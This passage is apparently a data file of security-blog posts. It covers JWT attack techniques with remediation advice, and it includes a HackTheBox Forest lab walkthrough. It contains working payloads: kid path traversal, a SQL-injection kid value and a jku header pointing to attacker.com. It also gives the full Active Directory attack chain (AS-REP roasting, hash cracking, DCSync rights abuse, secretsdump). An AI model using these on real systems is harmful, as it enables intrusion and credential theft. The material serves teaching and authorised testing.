        "Convert the PEM public key to a suitable string format.",
        "Sign the forged token using HMAC-SHA256 with the public key string as the password."
      ]},

      { type: 'subheading', value: "Attack 3: KID (Key ID) Manipulation" },
      { type: 'paragraph', value: "The kid header parameter tells the server which key to use to verify the signature." },
      
      { type: 'paragraph', value: "A. Directory Traversal (/dev/null): If the server uses the kid to look up a key file in the filesystem, an attacker can point it to a predictable file." },
      { type: 'code', language: 'json', value: `Header: {"alg": "HS256", "kid": "../../../dev/null"}` },
      { type: 'paragraph', value: "Attack: Sign the token with an empty string (since /dev/null is empty). The server reads /dev/null, gets an empty key, and verifies the signature successfully." },

      { type: 'paragraph', value: "B. SQL Injection: If the kid is used in a database query (e.g., SELECT key FROM keys WHERE kid = '...'), an attacker can inject SQL." },
      { type: 'code', language: 'json', value: `Header: {"kid": "Tk' UNION SELECT 'secret' --"}` },
      { type: 'paragraph', value: "Attack: Force the database to return a known string (like \"secret\") as the key, then sign the token with \"secret\"." },

      { type: 'subheading', value: "Attack 4: JKU (JSON Web Key URL) Injection" },
      { type: 'paragraph', value: "The jku header parameter specifies a URL where the server can find the JWK (JSON Web Key) to verify the signature." },
      { type: 'paragraph', value: "Attack: An attacker hosts their own jwks.json file containing their own public key." },
      { type: 'paragraph', value: "Payload: They change the jku header to point to their malicious server (http://attacker.com/jwks.json) and sign the token with their private key." },
      { type: 'paragraph', value: "Result: The server fetches the key from the attacker's URL and verifies the malicious token." },

      { type: 'subheading', value: "Attack 5: Weak Secret Brute Force" },
      { type: 'paragraph', value: "If a developer uses a symmetric algorithm (HS256) with a weak secret (e.g., \"secret123\", \"password\"), you can crack it offline. You don't need to interact with the server; you just need one valid token." },

      { type: 'heading', value: "4. Tools for Testing JWT" },
      { type: 'paragraph', value: "As a security analyst, you shouldn't manually calculate Base64. Use these tools:" },
      { type: 'list', value: [
        "jwt_tool (by ticarpi): The swiss-army knife for JWTs. Usage: python3 jwt_tool.py <token> -X a (Exploit \"none\" algo) or -C -d dictionary.txt (Crack secret).",
        "Burp Suite (JWT Editor Extension): Allows you to modify JWTs on the fly within Repeater. Can auto-resign tokens using a new key or \"None\" algo.",
        "Hashcat: The fastest way to brute-force secrets. Command: hashcat -m 16500 token.txt wordlist.txt.",
        "JSON Web Token Toolkit (v2): Excellent for automating header injection attacks."
      ]},

      { type: 'heading', value: "5. Remediation: How to Fix It" },
      { type: 'paragraph', value: "If you are a developer or advising one, here is the checklist:" },
      { type: 'list', value: [
        "Force the Algorithm: Do not trust the alg header. Explicitly define the expected algorithm in your verification function. Bad: jwt.verify(token, key). Good: jwt.verify(token, key, { algorithms: ['RS256'] }).",
        "Use Strong Secrets: For HS256, use a random 64-character alphanumeric string.",
        "Validate kid and jku: Ideally, do not use jku. If you must, use a strict allowlist of trusted domains (e.g., only allow https://kpmg.com/keys).",
        "Use Asymmetric Keys (RS256): It is safer for distributed systems. The private key never leaves the auth server.",
        "Short Expiration: Set a short exp time (e.g., 15 minutes) to limit the window of opportunity for stolen tokens."
      ]},

      { type: 'heading', value: "Conclusion" },
      { type: 'paragraph', value: "JWTs are powerful, but their flexibility is often their downfall. By understanding the structure—specifically the trust relationship between the Header and the Signature—security professionals can identify critical flaws that lead to full account takeovers." },
      { type: 'paragraph', value: "Disclaimer: This guide is for educational purposes only. Always obtain written permission before testing authentication mechanisms on live systems." }
    ]
  },
  {
    id: '5',
    slug: 'hackthebox-forest-walkthrough',
    title: 'HackTheBox: Forest',
    excerpt: 'Operational Debrief: Detailed walkthrough of the Forest machine. Exploiting AS-REP Roasting, BloodHound enumeration, and ACL Abuse for Domain Dominance.',
    date: 'Nov 20, 2024',
    readTime: '30 min read',
    category: 'walkthrough',
    image: 'https://images.unsplash.com/photo-1518544806308-c8f325cc27cc?q=80&w=2070&auto=format&fit=crop', // Dark Forest/Trees
    tags: ['HTB', 'Active Directory', 'Walkthrough'],
    content: [
      { type: 'heading', value: "Mission Profile: Forest" },
      { type: 'paragraph', value: "Forest is a Hard-rated Windows machine on HackTheBox that effectively simulates a real-world Active Directory environment. The path to Domain Admin requires understanding Kerberos pre-authentication attacks and abusing Exchange Windows Permissions." },
      
      { type: 'subheading', value: "Phase 1: Reconnaissance" },
      { type: 'paragraph', value: "We begin with a full port scan to identify the attack surface." },
      { type: 'code', language: 'bash', value: `nmap -p- --min-rate 10000 10.10.10.161 -oN scans/allports` },
      { type: 'paragraph', value: "The scan reveals a standard Domain Controller profile: Ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 445 (SMB), 593 (RPC over HTTP)." },

      { type: 'subheading', value: "Phase 2: User Enumeration" },
      { type: 'paragraph', value: "Using 'enum4linux' or 'rpcclient', we can attempt to list users. We successfully identified a list of valid domain users, which we saved to 'users.txt'." },

      { type: 'subheading', value: "Phase 3: AS-REP Roasting (Foothold)" },
      { type: 'paragraph', value: "A common misconfiguration in AD is disabling Kerberos Pre-Authentication. This allows an attacker to request a TGT for a user and receive an encrypted part of the ticket (AS-REP) which can be cracked offline." },
      { type: 'code', language: 'bash', value: `impacket-GetNPUsers htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast` },
      { type: 'paragraph', value: "Success! We captured a hash for the user 'svc-alfresco'. Proceeding to crack it with Hashcat mode 18200." },
      { type: 'code', language: 'bash', value: `hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt` },
      { type: 'paragraph', value: "Result: svc-alfresco : s3rvice" },

      { type: 'subheading', value: "Phase 4: Privilege Escalation" },
      { type: 'paragraph', value: "We log in via Evil-WinRM using the compromised credentials." },
      { type: 'code', language: 'bash', value: `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` },
      { type: 'paragraph', value: "Once inside, we deploy the SharpHound collector to gather data for BloodHound analysis." },
      
      { type: 'heading', value: "BloodHound Analysis" },
      { type: 'paragraph', value: "Visualizing the graph reveals a critical path:" },
      { type: 'list', value: [
        "User: svc-alfresco is a member of 'Service Accounts'.",
        "Group: 'Service Accounts' is a member of 'Privileged IT Accounts'.",
        "Group: 'Privileged IT Accounts' is a member of 'Account Operators'.",
        "Impact: 'Account Operators' can manage the 'Exchange Windows Permissions' group."
      ]},
      
      { type: 'paragraph', value: "The 'Exchange Windows Permissions' group has 'WriteDacl' rights on the Domain Object. This is game over." },

      { type: 'subheading', value: "Execution: ACL Abuse" },
      { type: 'paragraph', value: "1. Create a new user controlled by us." },
      { type: 'code', language: 'powershell', value: `net user owned Password123! /add /domain` },
      { type: 'paragraph', value: "2. Add our user to the 'Exchange Windows Permissions' group." },
      { type: 'code', language: 'powershell', value: `net group "Exchange Windows Permissions" owned /add` },
      { type: 'paragraph', value: "3. Use the 'WriteDacl' permission to grant our user 'DCSync' rights on the domain." },
      { type: 'code', language: 'bash', value: `python3 dacledit.py -action 'write' -rights 'DCSync' -principal 'owned' -target-dn 'DC=htb,DC=local' ...` },

      { type: 'heading', value: "Phase 5: Domain Dominance" },
      { type: 'paragraph', value: "With DCSync rights, we can simulate the replication process of a Domain Controller and request the password hashes for any user, including the Administrator." },
      { type: 'code', language: 'bash', value: `impacket-secretsdump htb.local/owned:Password123!@10.10.10.161` },
      { type: 'paragraph', value: "We successfully dump the NTLM hash for the Administrator account. The domain is compromised." }
    ]
  }
];